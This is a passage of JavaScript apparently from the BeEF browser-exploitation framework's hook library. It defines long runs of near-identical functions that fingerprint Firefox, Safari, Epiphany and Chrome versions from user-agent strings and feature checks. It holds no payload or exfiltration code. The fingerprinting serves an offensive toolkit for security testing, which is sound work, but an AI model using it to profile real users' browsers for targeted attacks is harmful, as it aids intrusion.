        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/73./) != null;
    },

    /**
     * Returns true if FF74
     * @example: beef.browser.isFF74()
     */
    isFF74: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/74./) != null;
    },

    /**
     * Returns true if FF75
     * @example: beef.browser.isFF75()
     */
    isFF75: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/75./) != null;
    },

    /**
     * Returns true if FF76
     * @example: beef.browser.isFF76()
     */
    isFF76: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/76./) != null;
    },

    /**
     * Returns true if FF77
     * @example: beef.browser.isFF77()
     */
    isFF77: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/77./) != null;
    },

    /**
     * Returns true if FF78
     * @example: beef.browser.isFF78()
     */
    isFF78: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/78./) != null;
    },

    /**
     * Returns true if FF79
     * @example: beef.browser.isFF79()
     */
    isFF79: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/79./) != null;
    },

    /**
     * Returns true if FF80
     * @example: beef.browser.isFF80()
     */
    isFF80: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/80./) != null;
    },

    /**
     * Returns true if FF81
     * @example: beef.browser.isFF81()
     */
    isFF81: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/81./) != null;
    },

    /**
     * Returns true if FF82
     * @example: beef.browser.isFF82()
     */
    isFF82: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/82./) != null;
    },

    /**
     * Returns true if FF83
     * @example: beef.browser.isFF83()
     */
    isFF83: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/83./) != null;
    },

    /**
     * Returns true if FF84
     * @example: beef.browser.isFF84()
     */
    isFF84: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/84./) != null;
    },

    /**
     * Returns true if FF85
     * @example: beef.browser.isFF85()
     */
    isFF85: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/85./) != null;
    },

    /**
     * Returns true if FF86
     * @example: beef.browser.isFF86()
     */
    isFF86: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/86./) != null;
    },

    /**
     * Returns true if FF87
     * @example: beef.browser.isFF87()
     */
    isFF87: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/87./) != null;
    },

    /**
     * Returns true if FF88
     * @example: beef.browser.isFF88()
     */
    isFF88: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/88./) != null;
    },

    /**
     * Returns true if FF89
     * @example: beef.browser.isFF89()
     */
    isFF89: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/89./) != null;
    },

    /**
     * Returns true if FF90
     * @example: beef.browser.isFF90()
     */
    isFF90: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/90./) != null;
    },

    /**
     * Returns true if FF91
     * @example: beef.browser.isFF91()
     */
    isFF91: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/91./) != null;
    },

    /**
     * Returns true if FF92
     * @example: beef.browser.isFF92()
     */
    isFF92: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/92./) != null;
    },

    /**
     * Returns true if FF93
     * @example: beef.browser.isFF93()
     */
    isFF93: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/93./) != null;
    },

    /**
     * Returns true if FF94
     * @example: beef.browser.isFF94()
     */
    isFF94: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/94./) != null;
    },

    /**
     * Returns true if FF95
     * @example: beef.browser.isFF95()
     */
    isFF95: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/95./) != null;
    },

    /**
     * Returns true if FF96
     * @example: beef.browser.isFF96()
     */
    isFF96: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/96./) != null;
    },

    /**
     * Returns true if FF97
     * @example: beef.browser.isFF97()
     */
    isFF97: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/97./) != null;
    },

    /**
     * Returns true if FF98
     * @example: beef.browser.isFF98()
     */
    isFF98: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/98./) != null;
    },

    /**
     * Returns true if FF99
     * @example: beef.browser.isFF99()
     */
    isFF99: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/99./) != null;
    },

    /**
     * Returns true if FF.
     * @example: beef.browser.isFF()
     */
    isFF: function() {
        return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24() || this.isFF25() || this.isFF26() || this.isFF27() || this.isFF28() || this.isFF29() || this.isFF30() || this.isFF31() || this.isFF32() || this.isFF33() || this.isFF34() || this.isFF35() || this.isFF36() || this.isFF37() || this.isFF38() || this.isFF39() || this.isFF40() || this.isFF41() || this.isFF42() || this.isFF43() || this.isFF44() || this.isFF45() || this.isFF46() || this.isFF47() || this.isFF48() || this.isFF49() || this.isFF50() || this.isFF51() || this.isFF52() || this.isFF53() || this.isFF54() || this.isFF55() || this.isFF56() || this.isFF57() || this.isFF58() || this.isFF59() || this.isFF60() || this.isFF61() || this.isFF62() || this.isFF63() || this.isFF64() || this.isFF65() || this.isFF66() || this.isFF67() || this.isFF68() || this.isFF69() || this.isFF70() || this.isFF71() || this.isFF72() || this.isFF73() || this.isFF74() || this.isFF75() || this.isFF76() || this.isFF77() || this.isFF78() || this.isFF79() || this.isFF80() || this.isFF81() || this.isFF82() || this.isFF83() || this.isFF84() || this.isFF85() || this.isFF86() || this.isFF87() || this.isFF88() || this.isFF89() || this.isFF90() || this.isFF91() || this.isFF92() || this.isFF93() || this.isFF94() || this.isFF95() || this.isFF96() || this.isFF97() || this.isFF98() || this.isFF99();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: beef.browser.isS4()
     */
    isS4: function() {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/4/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket"in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: beef.browser.isS5()
     */
    isS5: function() {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/5/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket"in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: beef.browser.isS6()
     */
    isS6: function() {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/6/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket"in window));
    },

    /**
     * Returns true if Safari 7.xx
     * @example: beef.browser.isS7()
     */
    isS7: function() {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/7/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket"in window));
    },

    /**
     * Returns true if Safari 8.xx
     * @example: beef.browser.isS8()
     */
    isS8: function() {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/8/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket"in window));
    },

    /**
     * Returns true if Safari.
     * @example: beef.browser.isS()
     */
    isS: function() {
        return this.isS4() || this.isS5() || this.isS6() || this.isS7() || this.isS8();
    },

    /**
     * Returns true if Webkit based
     *
     * **** DUPLICATE WARNING **** Changes here may aldo need addressed in /isS\d+/ functions.
     */
    isWebKitBased: function() {
        return (!window.opera && !window.chrome && window.navigator.userAgent.match(/ Version\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !("MozWebSocket"in window));
    },

    /**
     * Return true if Epiphany
     * @example: beef.browser.isEpi()
     */
    isEpi: function() {
        // Epiphany is based on webkit
        // due to the uncertainty of webkit version vs Epiphany versions tracking.
        // -- do webkit based checking (i.e. do safari checks)
        return this.isWebKitBased() && window.navigator.userAgent.match(/Epiphany\//) != null;
    },

    /**
     * Returns true if Chrome 5.
     * @example: beef.browser.isC5()
     */
    isC5: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: beef.browser.isC6()
     */
    isC6: function() {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: beef.browser.isC7()
     */
    isC7: function() {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: beef.browser.isC8()
     */
    isC8: function() {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: beef.browser.isC9()
     */
    isC9: function() {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: beef.browser.isC10()
     */
    isC10: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: beef.browser.isC11()
     */
    isC11: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: beef.browser.isC12()
     */
    isC12: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: beef.browser.isC13()
     */
    isC13: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: beef.browser.isC14()
     */
    isC14: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: beef.browser.isC15()
     */
    isC15: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: beef.browser.isC16()
     */
    isC16: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: beef.browser.isC18()
     */
    isC18: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: beef.browser.isC19()
     */
    isC19: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 19.
     * @example: beef.browser.isC19iOS()
     */
    isC19iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: beef.browser.isC20()
     */
    isC20: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 20.
     * @example: beef.browser.isC20iOS()
     */
    isC20iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: beef.browser.isC21()
     */
    isC21: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 21.
     * @example: beef.browser.isC21iOS()
     */
    isC21iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: beef.browser.isC22()
     */
    isC22: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 22.
     * @example: beef.browser.isC22iOS()
     */
    isC22iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: beef.browser.isC23()
     */
    isC23: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 23.
     * @example: beef.browser.isC23iOS()
     */
    isC23iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: beef.browser.isC24()
     */
    isC24: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 24.
     * @example: beef.browser.isC24iOS()
     */
    isC24iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome 25.
     * @example: beef.browser.isC25()
     */
    isC25: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 25.
     * @example: beef.browser.isC25iOS()
     */
    isC25iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome 26.
     * @example: beef.browser.isC26()
     */
    isC26: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 26.
     * @example: beef.browser.isC26iOS()
     */
    isC26iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome 27.
     * @example: beef.browser.isC27()
     */
    isC27: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 27.
     * @example: beef.browser.isC27iOS()
     */
    isC27iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome 28.
     * @example: beef.browser.isC28()
     */
    isC28: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 28.
     * @example: beef.browser.isC28iOS()
     */
    isC28iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome 29.
     * @example: beef.browser.isC29()
     */
    isC29: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 29.
     * @example: beef.browser.isC29iOS()
     */
    isC29iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome 30.
     * @example: beef.browser.isC30()
     */
    isC30: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 30.
     * @example: beef.browser.isC30iOS()
     */
    isC30iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome 31.
     * @example: beef.browser.isC31()
     */
    isC31: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 31.
     * @example: beef.browser.isC31iOS()
     */
    isC31iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome 32.
     * @example: beef.browser.isC32()
     */
    isC32: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 32.
     * @example: beef.browser.isC32iOS()
     */
    isC32iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome 33.
     * @example: beef.browser.isC33()
     */
    isC33: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 33.
     * @example: beef.browser.isC33iOS()
     */
    isC33iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome 34.
     * @example: beef.browser.isC34()
     */
    isC34: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 34.
     * @example: beef.browser.isC34iOS()
     */
    isC34iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome 35.
     * @example: beef.browser.isC35()
     */
    isC35: function() {
